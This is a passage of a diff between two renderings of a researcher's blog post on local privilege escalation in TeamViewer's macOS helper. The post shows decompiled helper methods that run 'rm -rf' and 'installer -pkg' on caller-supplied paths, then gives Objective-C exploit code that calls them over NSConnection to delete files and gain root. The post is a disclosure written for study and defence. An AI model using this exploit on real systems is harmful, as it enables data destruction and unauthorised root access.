-</span></span><span style="display:flex;"><span>    system([objc_retainAutorelease([[NSString <span style="color:#99f">stringWithFormat</span>:<span style="color:#c30">@&#34;rm -rf &#39;%@&#39;&#34;</span>, r14] <span style="color:#069;font-weight:bold">retain</span>]) UTF8String]);
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    [r14 <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    system([objc_retainAutorelease([[NSString <span style="color:#99f">stringWithFormat</span>:<span style="color:#c30">@&#34;rm -rf &#39;%@&#39;&#34;</span>, [[rax remotePrintingPrinterIconPath] <span style="color:#069;font-weight:bold">retain</span>]] <span style="color:#069;font-weight:bold">retain</span>]) UTF8String]);
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    system([objc_retainAutorelease([[NSString <span style="color:#99f">stringWithFormat</span>:<span style="color:#c30">@&#34;rm -rf &#39;%@&#39;&#34;</span>, [[rax remotePrintingDatabasePath] <span style="color:#069;font-weight:bold">retain</span>]] <span style="color:#069;font-weight:bold">retain</span>]) UTF8String]);
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>We find that it will run four system commands based on the argument we pass in, and it will delete four files or directories. The argument we pass should have a <code>stringArguments</code> property, which will also have a <code>remotePrintingPPDPath</code> property. Inspecting the class-dump, we can find the class with this property.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@interface</span> <span style="color:#0a8;font-weight:bold">HelperArguments</span> : <span style="color:#0a8;font-weight:bold">NSObject</span> <span style="color:#555">&lt;</span>NSCopying, NSCoding<span style="color:#555">&gt;</span>
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>(...)
-</span></span><span style="display:flex;"><span>    NSString <span style="color:#555">*</span>_bundlePath;
-</span></span><span style="display:flex;"><span>    NSString <span style="color:#555">*</span>_processLockName;
-</span></span><span style="display:flex;"><span>    HelperStringArguments <span style="color:#555">*</span>_stringArguments;
-</span></span><span style="display:flex;"><span>    TestMasterConfiguration <span style="color:#555">*</span>_testMasterConfig;
-</span></span><span style="display:flex;"><span>    NSString <span style="color:#555">*</span>_appPath;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Based on this we can conclude that the main object that is being sent via the connection is the <code>HelperArguments</code> which has a<code>stringArguments</code> property of the class type <code>HelperStringArguments</code>. We can find that class also in the class-dump.</p>
-<pre tabindex="0"><code>@interface HelperStringArguments : NSObject &lt;NSCopying, NSCoding&gt;
+<pre><code class=language-objectivec>@interface BlessedHelperDistantObject : NSObject &lt;BlessedHelperProxy&gt;
+{
+    struct AuthorizationOpaqueRef *_authorization;
+}
+
+@property(nonatomic) struct AuthorizationOpaqueRef *authorization; // @synthesize authorization=_authorization;
+- (void)uninstallRemotePrinting:(id)arg1;
+- (BOOL)installRemotePrinting:(id)arg1;
+- (void)configureTestMaster:(id)arg1;
+- (void)deleteAuthPlugin;
+- (BOOL)helperSignatureMatchesSignatureOfBundleAtURL:(id)arg1 helperName:(id)arg2;
+- (struct __SecRequirement *)copyOwnRequirementForHelperName:(id)arg1;
+- (void)uninstall:(id)arg1;
+- (void)writeLaunchdPropertyLists:(id)arg1;
+- (void)deleteTVinOverridesPlist:(id)arg1;
+- (void)loadDaemon:(id)arg1;
+- (BOOL)run:(id)arg1;
+- (void)terminate;
+- (BOOL)runWithArguments:(id)arg1 helperName:(id)arg2;
+- (BOOL)needsUpdate:(id)arg1 helperName:(id)arg2;
+@property(readonly, copy, nonatomic) NSString *version;
+- (void)dealloc;
+- (id)init;
+
+// Remaining properties
+@property(readonly, copy) NSString *debugDescription;
+@property(readonly, copy) NSString *description;
+@property(readonly) unsigned long long hash;
+@property(readonly) Class superclass;
+
+@end</code></pre>
+<p>There are quite a few interesting methods, but we will focus on <code>installRemotePrinting</code> and <code>uninstallRemotePrinting</code>. Unfortunately we don't get an indication of the passed arguments from the class-dump.</p>
+<h2 id="uninstallremoteprinting---arbitrary-file-deletion">uninstallRemotePrinting - Arbitrary file deletion<a class="anchor" href="#uninstallremoteprinting---arbitrary-file-deletion" aria-label="link to this section">#</a></h2>
+<p>Let's inspect  <code>uninstallRemotePrinting</code> first.</p>
+<pre><code class=language-objectivec>/* @class BlessedHelperDistantObject */
+-(void)uninstallRemotePrinting:(void *)arg2 {
+    system([objc_retainAutorelease([[NSString stringWithFormat:@"rm -rf '%@'", [[[[arg2 stringArguments] retain] remotePrintingPPDPath] retain]] retain]) UTF8String]);
+    [rax release];
+    [rax release];
+    r14 = [[rax remotePrintingFilterPath] retain];
+    system([objc_retainAutorelease([[NSString stringWithFormat:@"rm -rf '%@'", r14] retain]) UTF8String]);
+    [rax release];
+    [r14 release];
+    system([objc_retainAutorelease([[NSString stringWithFormat:@"rm -rf '%@'", [[rax remotePrintingPrinterIconPath] retain]] retain]) UTF8String]);
+    [rax release];
+    [rax release];
+    system([objc_retainAutorelease([[NSString stringWithFormat:@"rm -rf '%@'", [[rax remotePrintingDatabasePath] retain]] retain]) UTF8String]);
+    [rax release];
+    [rax release];
+    [rax release];
+    return;
+}</code></pre>
+<p>We find that it will run four system commands based on the argument we pass in, and it will delete four files or directories. The argument we pass should have a <code>stringArguments</code> property, which will also have a <code>remotePrintingPPDPath</code> property. Inspecting the class-dump, we can find the class with this property.</p>
+<pre><code class=language-objectivec>@interface HelperArguments : NSObject &lt;NSCopying, NSCoding&gt;
+{
+(...)
+    NSString *_bundlePath;
+    NSString *_processLockName;
+    HelperStringArguments *_stringArguments;
+    TestMasterConfiguration *_testMasterConfig;
+    NSString *_appPath;
+}</code></pre>
+<p>Based on this we can conclude that the main object that is being sent via the connection is the <code>HelperArguments</code> which has a<code>stringArguments</code> property of the class type <code>HelperStringArguments</code>. We can find that class also in the class-dump.</p>
+<pre><code>@interface HelperStringArguments : NSObject &lt;NSCopying, NSCoding&gt;
 {
 (...)
     NSString *_remotePrintingInstallPkgName;
@@ -395,178 +185,94 @@ Ian Beer from Google Project zero also talked about these:
     NSString *_remotePrintingPrinterIconPath;
     NSString *_remotePrintingDatabasePath;
 (...)
-}
-</code></pre><p>That class has a <code>remotePrintingPPDPath</code> property along with plenty of other NSString objects.</p>
+}</code></pre>
+<p> That class has a <code>remotePrintingPPDPath</code> property along with plenty of other NSString objects.</p>
 <p>To exploit this method we need to implement these classes, and create an object and setup their properties. This is shown below.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span>   <span style="color:#09f;font-style:italic">//setup parameters
-</span></span></span><span style="display:flex;"><span>    HelperStringArguments <span style="color:#555">*</span> hsa <span style="color:#555">=</span> [HelperStringArguments new];
-</span></span><span style="display:flex;"><span>     <span style="color:#09f;font-style:italic">//uninstallRemotePrinting will use these 4, any file specified here will be deleted
-</span></span></span><span style="display:flex;"><span>    hsa.remotePrintingPPDPath <span style="color:#555">=</span> <span style="color:#c30">@&#34;/Library/a.txt&#34;</span>;
-</span></span><span style="display:flex;"><span>    hsa.remotePrintingDatabasePath <span style="color:#555">=</span> <span style="color:#c30">@&#34;/Library/b.txt&#34;</span>;
-</span></span><span style="display:flex;"><span>    hsa.remotePrintingPrinterIconPath<span style="color:#555">=</span> <span style="color:#c30">@&#34;/Library/c.txt&#34;</span>;
-</span></span><span style="display:flex;"><span>    hsa.remotePrintingFilterPath <span style="color:#555">=</span> <span style="color:#c30">@&#34;/Library/d.txt&#34;</span>;
-</span></span><span style="display:flex;"><span>     
-</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">//we create our object
-</span></span></span><span style="display:flex;"><span>    HelperArguments <span style="color:#555">*</span> helperargs <span style="color:#555">=</span> [[HelperArguments alloc] init];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">//we need to embed HelperStringArguments
-</span></span></span><span style="display:flex;"><span>    helperargs.stringArguments <span style="color:#555">=</span> hsa;
-</span></span></code></pre></div><p>To connect to the remote helper is fairly simple.</p>
-<pre tabindex="0"><code>    NSConnection *c = [NSConnection connectionWithRegisteredName:@&#34;com.teamviewer.Helper&#34; host:nil];
+<pre><code class=language-objectivec>   //setup parameters
+    HelperStringArguments * hsa = [HelperStringArguments new];
+     //uninstallRemotePrinting will use these 4, any file specified here will be deleted
+    hsa.remotePrintingPPDPath = @"/Library/a.txt";
+    hsa.remotePrintingDatabasePath = @"/Library/b.txt";
+    hsa.remotePrintingPrinterIconPath= @"/Library/c.txt";
+    hsa.remotePrintingFilterPath = @"/Library/d.txt";
+     
+    //we create our object
+    HelperArguments * helperargs = [[HelperArguments alloc] init];
+
+    //we need to embed HelperStringArguments
+    helperargs.stringArguments = hsa;</code></pre>
+<p>To connect to the remote helper is fairly simple.</p>
+<pre><code>    NSConnection *c = [NSConnection connectionWithRegisteredName:@"com.teamviewer.Helper" host:nil];
     BlessedHelperDistantObject *proxy = (BlessedHelperDistantObject *)[c rootProxy];
-    [proxy uninstallRemotePrinting:helperargs];
-</code></pre><p>We create an <code>NSConnection</code> and then call the remote methods. The files we specify above will be deleted.</p>
-<h2 id="installremoteprinting---user-to-root-privilege-escalation">
-  installRemotePrinting - user to root privilege escalation
-  <a class="heading-link" href="#installremoteprinting---user-to-root-privilege-escalation">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
-<p>The <code>installRemotePrinting:</code> method allows us to escalate our privileges to root. It&rsquo;s shown below.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* @class BlessedHelperDistantObject */</span>
-</span></span><span style="display:flex;"><span>-(<span style="color:#078;font-weight:bold">char</span>)<span style="color:#c0f">installRemotePrinting:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> {
-</span></span><span style="display:flex;"><span>    r15 <span style="color:#555">=</span> [arg2 <span style="color:#069;font-weight:bold">retain</span>];
-</span></span><span style="display:flex;"><span>    r13 <span style="color:#555">=</span> [[arg2 stringArguments] <span style="color:#069;font-weight:bold">retain</span>];
-</span></span><span style="display:flex;"><span>    rbx <span style="color:#555">=</span> [[arg2 bundlePath] <span style="color:#069;font-weight:bold">retain</span>];
-</span></span><span style="display:flex;"><span>    [r15 <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    r15 <span style="color:#555">=</span> [[rbx <span style="color:#99f">stringByAppendingPathComponent</span>:<span style="color:#c30">@&#34;Contents/Resources&#34;</span>] <span style="color:#069;font-weight:bold">retain</span>];
-</span></span><span style="display:flex;"><span>    [rbx <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    var_38 <span style="color:#555">=</span> r13;
-</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [r13 remotePrintingInstallPkgName];
-</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
-</span></span><span style="display:flex;"><span>    var_30 <span style="color:#555">=</span> r15;
-</span></span><span style="display:flex;"><span>    r12 <span style="color:#555">=</span> [[r15 <span style="color:#99f">stringByAppendingPathComponent</span>:rax] <span style="color:#069;font-weight:bold">retain</span>];
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [NSFileManager defaultManager];
-</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
-</span></span><span style="display:flex;"><span>    r13 <span style="color:#555">=</span> [rax <span style="color:#99f">fileExistsAtPath</span>:r12];
-</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (r13 <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
-</span></span><span style="display:flex;"><span>            system([objc_retainAutorelease([[NSString <span style="color:#99f">stringWithFormat</span>:<span style="color:#c30">@&#34;installer -pkg &#39;%@&#39; -target /&#34;</span>, r12] <span style="color:#069;font-weight:bold">retain</span>]) UTF8String]);
-</span></span><span style="display:flex;"><span>            [rax <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>            r14 <span style="color:#555">=</span> <span style="color:#f60">0x1</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> {
-</span></span><span style="display:flex;"><span>            r14 <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    [r12 <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    [var_30 <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    [var_38 <span style="color:#069;font-weight:bold">release</span>];
-</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> r14 <span style="color:#555">&amp;</span> <span style="color:#f60">0xff</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> rax;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>This function is slightly more complicated. It again expects a <code>HelperArguments</code> object. It will take its <code>stringArguments</code>  as well as the  <code>bundlePath</code> property. It will append <code>Contents/Resources</code> to the path found in <code>bundlePath</code> and append to that the <code>remotePrintingInstallPkgName</code> taken from the <code>stringArguments</code>. Once it has the full path it will install it via the <code>installer</code> command line.</p>
+    [proxy uninstallRemotePrinting:helperargs];</code></pre>
+<p>We create an <code>NSConnection</code> and then call the remote methods. The files we specify above will be deleted.</p>
+<h2 id="installremoteprinting---user-to-root-privilege-escalation">installRemotePrinting - user to root privilege escalation<a class="anchor" href="#installremoteprinting---user-to-root-privilege-escalation" aria-label="link to this section">#</a></h2>
+<p>The <code>installRemotePrinting:</code> method allows us to escalate our privileges to root. It's shown below.</p>
+<pre><code class=language-objectivec>/* @class BlessedHelperDistantObject */
+-(char)installRemotePrinting:(void *)arg2 {
+    r15 = [arg2 retain];
+    r13 = [[arg2 stringArguments] retain];
+    rbx = [[arg2 bundlePath] retain];
+    [r15 release];
+    r15 = [[rbx stringByAppendingPathComponent:@"Contents/Resources"] retain];
+    [rbx release];
+    var_38 = r13;
+    rax = [r13 remotePrintingInstallPkgName];
+    rax = [rax retain];
+    var_30 = r15;
+    r12 = [[r15 stringByAppendingPathComponent:rax] retain];
+    [rax release];
+    rax = [NSFileManager defaultManager];
+    rax = [rax retain];
+    r13 = [rax fileExistsAtPath:r12];
+    [rax release];
+    if (r13 != 0x0) {
+            system([objc_retainAutorelease([[NSString stringWithFormat:@"installer -pkg '%@' -target /", r12] retain]) UTF8String]);
+            [rax release];
+            r14 = 0x1;
+    }
+    else {
+            r14 = 0x0;
+    }
+    [r12 release];
+    [var_30 release];
+    [var_38 release];
+    rax = r14 &amp; 0xff;
+    return rax;
+}</code></pre>
+<p>This function is slightly more complicated. It again expects a <code>HelperArguments</code> object. It will take its <code>stringArguments</code>  as well as the  <code>bundlePath</code> property. It will append <code>Contents/Resources</code> to the path found in <code>bundlePath</code> and append to that the <code>remotePrintingInstallPkgName</code> taken from the <code>stringArguments</code>. Once it has the full path it will install it via the <code>installer</code> command line.</p>
 <p>In this case we need to setup our objects as follows.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span>   <span style="color:#09f;font-style:italic">//setup parameters
-</span></span></span><span style="display:flex;"><span>    HelperStringArguments <span style="color:#555">*</span> hsa <span style="color:#555">=</span> [HelperStringArguments new];
-</span></span><span style="display:flex;"><span>     
-</span></span><span style="display:flex;"><span>     <span style="color:#09f;font-style:italic">//this is the name of the package that will be installed by installRemotePrinting
-</span></span></span><span style="display:flex;"><span>    hsa.remotePrintingInstallPkgName <span style="color:#555">=</span> <span style="color:#c30">@&#34;my_package.pkg&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">//we create our object
-</span></span></span><span style="display:flex;"><span>    HelperArguments <span style="color:#555">*</span> helperargs <span style="color:#555">=</span> [[HelperArguments alloc] init];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">//installRemotePrinting will use this path to locate the package named above
-</span></span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">//package will need to be inside /Contents/Resources/
-</span></span></span><span style="display:flex;"><span>    helperargs.bundlePath <span style="color:#555">=</span> <span style="color:#c30">@&#34;/tmp/pkg.app&#34;</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">//we need to embed HelperStringArguments
-</span></span></span><span style="display:flex;"><span>    helperargs.stringArguments <span style="color:#555">=</span> hsa;
-</span></span></code></pre></div><p>And we will need to place a package file in <code>/tmp/pkg.app/Contents/Resources/my_package.pkg</code>.</p>
+<pre><code class=language-objectivec>   //setup parameters
+    HelperStringArguments * hsa = [HelperStringArguments new];
+     
+     //this is the name of the package that will be installed by installRemotePrinting
+    hsa.remotePrintingInstallPkgName = @"my_package.pkg";
+
+    //we create our object
+    HelperArguments * helperargs = [[HelperArguments alloc] init];
+
+    //installRemotePrinting will use this path to locate the package named above
+    //package will need to be inside /Contents/Resources/
+    helperargs.bundlePath = @"/tmp/pkg.app";
+    //we need to embed HelperStringArguments
+    helperargs.stringArguments = hsa;</code></pre>
+<p>And we will need to place a package file in <code>/tmp/pkg.app/Contents/Resources/my_package.pkg</code>.</p>
 <p>Full exploit code is available here:
-<a href="https://gist.github.com/theevilbit/6e49b2e1d1ca1189f4c936cbf170a101"  class="external-link" target="_blank" rel="noopener">TeamViewer LPE exploit · GitHub</a></p>
-<h3 id="fix">
-  Fix
-  <a class="heading-link" href="#fix">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h3>
-<p>TeamViewer rewrote their entire privileged helper from scratch, and now they use XPC, use audit tokens to verify clients and also make it in a secure way.</p>
-
-      </div>
-
-
-      <footer>
-        
-
-
-        
-        
-        
-        
-        
-        
-        
-      </footer>
-    </article>
-
-    
-  </section>
-
-    </div>
-
-    <footer class="footer">
-  <section class="container">
-    ©
-    
-      2019 -
-    
-    2026
-     Csaba Fitzl 
-    ·
-    
-    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
-    
-  </section>
-</footer>
-
-  </main>
-
-  
-
-  
-  
-  <script src="https://theevilbit.github.io/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
+<a href="https://gist.github.com/theevilbit/6e49b2e1d1ca1189f4c936cbf170a101" rel="noopener">TeamViewer LPE exploit · GitHub</a></p>
+<h3 id="fix">Fix<a class="anchor" href="#fix" aria-label="link to this section">#</a></h3>
+<p>TeamViewer rewrote their entire privileged helper from scratch, and now they use XPC, use audit tokens to verify clients and also make it in a secure way.</p></div>
+<nav class="pn"><a class="prev" href="/posts/experiences_with_asb/"><span>← previous</span>Experiences with Apple Security Bounty</a><a class="next" href="/posts/monterey_shortcuts/"><span>next →</span>macOS Monterey Shortcuts - First look</a></nav></article></main>
+  <footer class="foot">
+    <span>© 2026 Csaba Fitzl</span>
+    <span class="social"><a href="https://github.com/theevilbit/" rel="me noopener">GitHub</a><a href="https://x.com/theevilbit" rel="me noopener">X</a><a href="/index.xml" rel="me noopener">RSS</a></span>
+  </footer>
+</div>
+<script>
+document.getElementById("theme").addEventListener("click", function () {
+  var t = document.documentElement.dataset.theme === "light" ? "dark" : "light";
+  document.documentElement.dataset.theme = t;
+  try { localStorage.setItem("tb.theme", t); } catch (e) {}
+});
+</script>
 </body>
 </html>
